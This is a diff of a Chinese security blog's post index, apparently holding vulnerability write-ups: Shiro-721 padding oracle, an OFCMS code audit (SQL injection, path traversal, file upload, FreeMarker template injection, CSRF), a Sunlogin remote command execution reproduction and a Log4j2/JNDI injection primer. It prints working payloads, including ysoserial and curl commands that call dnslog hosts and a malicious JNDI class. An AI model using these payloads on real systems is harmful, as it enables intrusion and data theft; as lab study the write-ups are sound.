+<p><code>initNewCipher</code> 初始化解密模式，后续重载 <code>crypt</code> 调用了 <code>doFinal</code> 正式解密，如果调用失败会抛出异常。</p>
+<p>跟进 <code>doFinal</code> ，该方法会依次判断 <code>Cipher 对象是否被初始化 </code>, <code>传入的字节数组数据是否为空 </code> , <code>解密服务的服务提供商"</code>, 然后调用 <code>this.spi.engineDoFinal()</code> 方法对字节数组进行解密 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzo31jxb3j318807f3zk.jpg" alt="image-20220203004310667"></p>
+<p>走完整个流程后，跳回到 <code>convertBytesToPrincipals</code> 走到 <code>deserialize</code> 进行反序列化操作 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzo344d2sj31ex06pdgx.jpg" alt="image-20220203004736613"></p>
+<p>继续跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzo37s3o8j315t03rdgh.jpg" alt="image-20220203004838345"></p>
+<p>最后返回 用户名 <code>root</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzo36od86j31co0bnmzl.jpg" alt="image-20220203004943133"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzo38za0sj310x0ardhb.jpg" alt="image-20220203005008938"></p>
+<p>至此整个解密流程走完了，其实有些和解密过程我没继续跟，由于技术有限，看的比较懵逼，也就没详细跟了。</p>
+<p>参考链接：<a href="https://www.guildhab.top/2020/12/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-%e5%88%86%e6%9e%90-%e4%b8%8b/">https://www.guildhab.top/2020/12/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-%e5%88%86%e6%9e%90-%e4%b8%8b/</a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>脚本地址：<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a></p>
+<p>首先利用 <code>ysoserial</code> 生成一个 dnslog 的 class 文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "ping %USERNAME%.jdjwu7.ceye.io" &gt; payload.class</span><br></pre></td></tr></tbody></table></figure>
+
+<p>爆破密钥</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzp5mxr6rj30o80geadc.jpg" alt="image-20220203014100583"></p>
+<p>后续填充内容爆破密钥</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzp5lr83oj30i40ds41c.jpg" alt="image-20220203014838412"></p>
+<p>后续漏洞利用这块生成太麻烦，懒得搞了，留个坑</p>
+<p>参考链接：<a href="https://www.cnblogs.com/wh4am1/p/12761959.html">https://www.cnblogs.com/wh4am1/p/12761959.html</a></p>
+<p>工具跑一波</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzo35ud9dj31090u040u.jpg" alt="image-20220203011141933"></p>
+]]></content>
       <categories>
         <category>代码审计</category>
       </categories>
       <tags>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java代码审计-OFCMS</title>
+    <url>/2022/02/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-OFCMS/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0X01-环境搭建"><a href="#0X01-环境搭建" class="headerlink" title="0X01 环境搭建"></a>0X01 环境搭建</h1><p>Gitee 下载: <a href="https://gitee.com/oufu/ofcms">https://gitee.com/oufu/ofcms</a></p>
+<p>导入 IEDA ，Maven 根据 pox.xml 自动下载依赖组件<br>创建 ofcms 空数据库 </p>
+<p>修改</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ofcms-master/ofcms-admin/src/main/resources/dev/conf/db-config.properties</span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line">ofcms-master/ofcms-admin/src/main/resources/dev/conf/db.properties</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>Tomcat 配置 </p>
+<p><img src="image-20220223111431081.png" alt="image-20220223111431081"></p>
+<p><img src="image-20220223111506567.png" alt="image-20220223111506567"></p>
+<p>启动，安装CMS</p>
+<p><img src="image-20220223111541647.png" alt="image-20220223111541647"></p>
+<p><img src="image-20220223111620934.png" alt="image-20220223111620934"></p>
+<p>重启容器</p>
+<p><img src="image-20220223111711602.png" alt="image-20220223111711602"></p>
+<p><img src="image-20220223111733755.png" alt="image-20220223111733755"></p>
+<p>安装成功！</p>
+<h1 id="0X02-SQL注入"><a href="#0X02-SQL注入" class="headerlink" title="0X02 SQL注入"></a>0X02 SQL注入</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点：ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/system/SystemGenerateController.java</p>
+<p>47 行处，语句直接获取，未经过任何过滤</p>
+<p><img src="image-20220304202202119.png" alt="image-20220304202202119"></p>
+<p>跟进 update</p>
+<p><img src="image-20220304202643069.png" alt="image-20220304202643069"></p>
+<p>此处获取数据库资源连接，然后传送sql语句</p>
+<p><img src="image-20220304205517351.png" alt="image-20220304205517351"></p>
+<p>跟进</p>
+<p><img src="image-20220304210111880.png" alt="image-20220304210111880"></p>
+<p>pst.executeUpdate 执行了 sql 语句</p>
+<p>而这个对象方法只允许执行 insert、update、delete及DLL。</p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>功能点：系统设置-代码生成-增加<br><img src="image-20220304224121725.png" alt="image-20220304224121725"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">update of_cms_ad set ad_id=(updatexml(1,concat(0x7e,(select user())),0))</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="0X03-目录遍历"><a href="#0X03-目录遍历" class="headerlink" title="0X03 目录遍历"></a>0X03 目录遍历</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点：ofcms-master/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/cms/TemplateController.java</p>
+<p>28 行 </p>
+<p><img src="image-20220306050902862.png" alt="image-20220306050902862"></p>
+<p>getPara 无过滤，且整段代码中也没有对 <code>/ ../ ./</code> 做限制</p>
+<p><img src="image-20220306051726251.png" alt="image-20220306051726251"></p>
+<p>46 行 获取模板路径和当前传入的路径，new 一个 File 对象， pathFile.listFiles 列出当前目录、文件</p>
+<p><img src="image-20220306052447157.png" alt="image-20220306052447157"></p>
+<p>65 行</p>
+<p><img src="image-20220306052630935.png" alt="image-20220306052630935"></p>
+<p>此处表明，只显示 html、xml、css、js 文件中的内容。</p>
+<h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>功能点：模板设置-模板文件=模板资源</p>
+<p><img src="image-20220306052951479.png" alt="image-20220306052951479"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">localhost:8080/ofcms_admin_war/admin/cms/template/getTemplates.html?dir=../../../../../../../../../</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="image-20220306053044061.png" alt="image-20220306053044061"></p>
+<h1 id="0X04-文件上传"><a href="#0X04-文件上传" class="headerlink" title="0X04 文件上传"></a>0X04 文件上传</h1><p>漏洞原理同上，由于未对文件后缀名进行过滤及校验目录，导致可通过写入文件方式上传 jsp 目录文件，并保存至网站任意目录下。</p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点：ofcms-master/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/cms/TemplateController.java</p>
+<p>108 行</p>
+<p><img src="image-20220306071238079.png" alt="image-20220306071238079"></p>
+<p> SystemUtile.getSiteTemplatePath() 获取当前目录</p>
+<p><img src="image-20220306071830412.png" alt="image-20220306071830412"></p>
+<p> dirName 目录名，此处因未做过滤，可以穿越到其他目录</p>
+<p>fileName 文件名，也是没有做过滤，所以可直接修改文件名为 jsp 或 jspx</p>
+<p><img src="image-20220306072158954.png" alt="image-20220306072158954"></p>
+<p> fileContent 将内容中的&lt;&gt;实体化。。。</p>
+<p><img src="image-20220306072313951.png" alt="image-20220306072313951"></p>
+<p>此处写入文件内容，并保存到我们指定的位置。</p>
+<p>漏洞原理，就是没有经过过滤。</p>
+<h2 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>功能点：模板设置-模板资源</p>
+<p><img src="image-20220306073318796.png" alt="image-20220306073318796"></p>
+<p>抓包修改<br><img src="image-20220306073421253.png" alt="image-20220306073421253"></p>
+<p>上传成功</p>
+<p><img src="image-20220306073438968.png" alt="image-20220306073438968"></p>
+<h1 id="0X05-SSTI-模板注入"><a href="#0X05-SSTI-模板注入" class="headerlink" title="0X05 SSTI 模板注入"></a>0X05 SSTI 模板注入</h1><p>挖坑先，具体原理没咋研究过，但是可插入特殊的语句，模板解析可执行命令</p>
+<p><img src="image-20220306075147055.png" alt="image-20220306075147055"></p>
+<p><img src="image-20220306075157316.png" alt="image-20220306075157316"></p>
+<p>payload </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; </span><br><span class="line">${ ex("ifconfig") }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="0x06-CSRF"><a href="#0x06-CSRF" class="headerlink" title="0x06 CSRF"></a>0x06 CSRF</h1><p>前端 ofcms-admin/src/main/webapp/WEB-INF/page/admin/cms/template/index.html 代码中，未发现 CSRF-Token，存在漏洞</p>
+<p><img src="image-20220306075619210.png" alt="image-20220306075619210"></p>
+<p><img src="image-20220306075808058.png" alt="image-20220306075808058"></p>
+<p><img src="image-20220306075820775.png" alt="image-20220306075820775"></p>
+<p>上传成功</p>
+<p><img src="image-20220306075831693.png" alt="image-20220306075831693"></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>向日葵RCE漏洞复现</title>
+    <url>/2022/02/20/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>漏洞版本：</p>
+<p>向日葵个人版for Windows 11.0.0.33 &lt;=</p>
+<p>向日葵简约版 V1.0.1.43315（2021.12）</p>
+<p>11.1.1</p>
+<p>10.3.0.27372</p>
+<p>11.0.0.33162</p>
+<p>版本下载：</p>
+<p>官方网址下载然后抓包遍历ID即可</p>
+<p>工具下载：</p>
+<p><a href="https://github.com/Mr-xn/sunlogin_rce">https://github.com/Mr-xn/sunlogin_rce</a></p>
+<p>procexp64下载</p>
+<p><a href="http://www.xitongzhijia.net/soft/210933.html">http://www.xitongzhijia.net/soft/210933.html</a></p>
+<p>第一步：获取向日葵监听的端口</p>
+<p>打开 procexp ，右键点击向日葵，选中属性</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzk9mijth7j213u0u0qbs.jpg" alt="image-20220220202942932"></p>
+<p>监听端口</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzk9mknfr5j21260u077e.jpg" alt="image-20220220203126791"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">端口号：53921</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>第二步:获取 verify_string 值</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://10.211.55.6:53921/cgi-bin/rpc?action=verify-haras</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzk9mgbjcsj21ew0f0jsp.jpg" alt="image-20220220204616030"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">verify_string:  0243aFf9X19BCrB9vrfSLludf4jc9lai</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>第三步：拼接 payload 执行命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://10.211.55.6:53921/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ WHOAMI</span><br></pre></td></tr></tbody></table></figure>
+
+<p>cookie</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">CID=0243aFf9X19BCrB9vrfSLludf4jc9lai</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>命令执行成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzk9mjv582j21ge0u0gon.jpg" alt="image-20220220204747793"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzk9mlw7lfj21pa0u0tdl.jpg" alt="image-20220220204817225"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java代码审计-Log4j2漏洞分析</title>
+    <url>/2022/02/09/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0X01-Log4j2-组件"><a href="#0X01-Log4j2-组件" class="headerlink" title="0X01 Log4j2 组件"></a>0X01 Log4j2 组件</h1><p>Log4j2 日志组件是一款比较优秀的 Java程序日志监控组件，同属于 Java全生态中的基础组件之一。最近被爆出 <code>RCE</code> 漏洞，据不完全统计，影响多达60644个开源软件，涉及相关版本软件包更是达到321094个。且利用方式简单，之前测 XSS 的点，都可以用来插入恶意代码，被称为<code>核弹级漏洞</code>。</p>
+<h1 id="0X02-RMI"><a href="#0X02-RMI" class="headerlink" title="0X02 RMI"></a>0X02 RMI</h1><h2 id="RMI-概念"><a href="#RMI-概念" class="headerlink" title="RMI 概念"></a>RMI 概念</h2><p>要分析 Log4j2 漏洞 就得了解一下 RMI 和 JNDI。</p>
+<p>RMI 全称 Remote Method Invocation，是 JAVA 实现远程过程调用的应用程序编程接口，存储于 java.rmi 包中，使用期方法调用对象时，必须实现 Remote远程接口。它可以让客户机上运行的程序调用远程服务器上的对象。而远程方法调用的特性可以让开发者能够在网络环境中分布操作。RMI 宗旨就是尽可能简化远程接口对象的使用。</p>
+<h2 id="RMI-三层架构"><a href="#RMI-三层架构" class="headerlink" title="RMI 三层架构"></a>RMI 三层架构</h2><ul>
+<li>客户端<ul>
+<li>存根/桩(Stub)：远程对象在客户端上的代理。</li>
+<li>远程引用层(Remote Reference Layer)：解析并执行远程引用协议。</li>
+<li>传输层(Transport)：发送调用、传递远程方法参数、接收远程方法执行结果。</li>
+</ul>
+</li>
+<li>服务端<ul>
+<li>骨架(Skeleton)：读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。</li>
+<li>远程引用层(Remote Reference Layer)：处理远程引用后向骨架发送远程方法调用。</li>
+<li>传输层(Transport)：监听客户端的入站连接，接收并转发调用到远程引用层。</li>
+</ul>
+</li>
+<li>注册表<ul>
+<li>注册中心(Registry)：以URL形式注册远程对象，并向客户端回复对远程对象的引用。</li>
+</ul>
+</li>
+</ul>
+<p>流程图-引用先知社区小阳大佬的图</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l5tyd5j30vt0jbtbf.jpg" alt="image-20220212042508121"></p>
+<p>觉得上图太复杂可以看这幅图-引用先知社区大佬ghtwf01</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l4avrzj30py0f8t9q.jpg" alt="image-20220212042714950"></p>
+<h2 id="代码例子"><a href="#代码例子" class="headerlink" title="代码例子"></a>代码例子</h2><h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><p>先编写一个远程接口</p>
+<ul>
+<li>该接口需要继承 Remote 类，该类仅表示 RMI 标识接口，说明可进行 RMI JAVA 虚拟机调用</li>
+<li>需要声明 java.rmi.RemoteException 报错,因 RMI 通信本质是基于 “网络传输”</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface HelloWorld extends Remote {</span><br><span class="line">    public String hello() throws RemoteException;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>远程接口实现类</p>
+<ul>
+<li>需要继承 UnicastRemoteObject 类，用于生成 Stub(存根) 和 Skeleton(骨架)<ul>
+<li>Stub 可以看作远程对象在本地的一个代理，囊括了远程对象的具体信息，客户端可以通过这个代理和服务端进行交互。</li>
+<li>Skeleton 可以看作为服务端的一个代理，用来处理Stub发送过来的请求，然后去调用客户端需要的请求方法，最终将方法执行结果返回给 Stub 。</li>
+</ul>
+</li>
+<li>构造函数需要抛出 java.rmi.RemoteException 报错,同时使用 super() 关键词调用父类构造函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIHelloWorld extends UnicastRemoteObject implements HelloWorld {</span><br><span class="line">    protected RMIHelloWorld() throws RemoteException{</span><br><span class="line">        super();</span><br><span class="line">        System.out.println("RMIServer构造函数运行");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public String hello() throws RemoteException{</span><br><span class="line">        System.out.println("RMIServer接口调用成功");</span><br><span class="line">        return "RMIServer接口调用成功";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>服务端部署代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIS {</span><br><span class="line">    public static void main(String[] args) throws RemoteException {</span><br><span class="line">        RMIHelloWorld hello = new RMIHelloWorld();//创建远程对象</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);//创建注册表</span><br><span class="line">        registry.rebind("hello",hello);//将远程对象注册到注册表里面，并且设置值为hello</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>服务端配置完成后， RMIS 将提供的服务注册在 RMIService 上，并公开了固定路径，让客户端去访问。</p>
+<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIClient;</span><br><span class="line"></span><br><span class="line">import RMIServer.HelloWorld;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class RMIClient {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        //获取远程主机对象</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);</span><br><span class="line"></span><br><span class="line">        // 利用注册表的代理去查询远程注册表中名为hello的对象</span><br><span class="line">        HelloWorld h = (HelloWorld) registry.lookup("hello");</span><br><span class="line"></span><br><span class="line">        // 调用远程方法</span><br><span class="line">        String hello = h.hello();</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>客户端只需要调用 java.rmi.Naming.lookup 函数，通过公开的路径从RMIService服务器上拿到对应接口的实现类， 之后通过本地接口即可调用远程对象的方法 .</p>
+<p>首先我们启动服务端</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l4xzg8j31040l3ju3.jpg" alt="image-20220212050244178"></p>
+<p>可以看见服务端启动成功，并打印了构造函数的内容。</p>
+<p>然后启动客户端</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l2hvq9j30zu0jxtbk.jpg" alt="image-20220212050406054"></p>
+<p>成功调用了 hello 方法。</p>
+<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>上面由于做测试，我是分成多个文件编写的，有点麻烦，可以将服务端代码写在一个文件里面。</p>
+<p>服务端代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIS {</span><br><span class="line">    public interface HelloWorld extends Remote{</span><br><span class="line">        public String hello() throws RemoteException;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public class RMIHelloWorld extends UnicastRemoteObject implements HelloWorld{</span><br><span class="line">        protected RMIHelloWorld() throws RemoteException{</span><br><span class="line">            super();</span><br><span class="line">            System.out.println("RMIServer");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        public String hello() throws RemoteException{</span><br><span class="line">            System.out.println("RMIServer接口");</span><br><span class="line">            return "RMIServer接口";</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private void start() throws Exception{</span><br><span class="line">        RMIHelloWorld hello = new RMIHelloWorld();</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        registry.rebind("hello",hello);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        new RMIS().start();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>客户端代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class RMIClient {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);</span><br><span class="line"></span><br><span class="line">        //RMIS.HelloWorld h = (RMIS.HelloWorld) Naming.lookup("rmi://127.0.0.1:1099/hello");</span><br><span class="line">        //注意 这里接口得和服务端一致</span><br><span class="line">        RMIS.HelloWorld h = (RMIS.HelloWorld) registry.lookup("hello");</span><br><span class="line"></span><br><span class="line">        String hello = h.hello();</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>服务端启动</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l32ij7j315h0j6gob.jpg" alt="image-20220212050648257"></p>
+<p>客户端启动，成功调用了 hello 资源</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l3i18jj310x0je76s.jpg" alt="image-20220212050734053"></p>
+<p>大致了解了 RMI 整个流程 ， 其他的就不再深入，留个坑先。</p>
+<h1 id="0X03-JNDI"><a href="#0X03-JNDI" class="headerlink" title="0X03 JNDI"></a>0X03 JNDI</h1><p>JNDI 是 Java 命名和目录接口，全称（Java Naming and Directory Interface，缩写 JNDI ），是 Java 的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+<h2 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h2><p><code>JNDI</code>注入简单来说就是在<code>JNDI</code>接口在初始化时，如：<code>InitialContext.lookup(URI)</code>，如果URI可控，那么客户端就可能会被攻击。</p>
+<p>通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个<code>Reference</code>对象，<code>Reference</code>对象中指定从远程加载构造的恶意<code>Factory</code>类，客户端在进行<code>lookup</code>的时候，会从远程动态加载攻击者构造的恶意<code>Factory</code>类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。</p>
+<ul>
+<li><code>className</code> - 远程加载时所使用的类名</li>
+<li><code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</li>
+<li><code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>等协议</li>
+</ul>
+<p>由于<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类，故不能作为远程对象bind到注册中心，所以需要使用<code>ReferenceWrapper</code>对<code>Reference</code>的实例进行一个封装。</p>
+<p>服务端配置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIServer {</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {</span><br><span class="line">    	//创建注册表</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        Reference reference = new Reference("Expload", "Expload", "http://127.0.0.1:80");</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);//封装对象</span><br><span class="line">        registry.bind("exp",referenceWrapper); //将封装的对象绑定到 exp 上</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>创建一个恶意代码执行类  expload </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">public class Expload {</span><br><span class="line">    public Expload() throws Exception{</span><br><span class="line">        Runtime.getRuntime().exec("curl xxxx.ceye.io");</span><br><span class="line">        System.out.println("expload攻击");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>编译成 class 文件，创建一个小型的web服务器,需在 class 文件目录下创建</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 -m http.server 80  //创建小型web服务器</span><br><span class="line"></span><br><span class="line">javac Expload  //编译java文件</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogmlqi7j20uq02gt94.jpg" alt="image-20220213051317682"></p>
+<p>客户端配置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class JNDI_Exp {</span><br><span class="line">    public static void main(String[] args) throws NamingException {</span><br><span class="line">    	//版本过高，需要人为设定 rmi 或 jndi 为true</span><br><span class="line">        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");</span><br><span class="line">        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");</span><br><span class="line">        new InitialContext().lookup("rmi://127.0.0.1:1099/exp");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功调用</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogdujebj21ba0u0gr2.jpg" alt="image-20220213051540667"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogkby63j22io0qgdih.jpg" alt="image-20220213051609667"></p>
+<p>大致了解了 RMI 和 JNDI 的用法，可以开始分析一波 log4j2 漏洞原理。</p>
+<h1 id="0X04-环境搭建"><a href="#0X04-环境搭建" class="headerlink" title="0X04 环境搭建"></a>0X04 环境搭建</h1><p>在网上有现成的漏洞环境，这里就不在详细赘述。</p>
+<p>漏洞环境：<a href="https://github.com/haigeek/Log4j2_RCE">https://github.com/haigeek/Log4j2_RCE</a></p>
+<p>IDEA导入即可。</p>
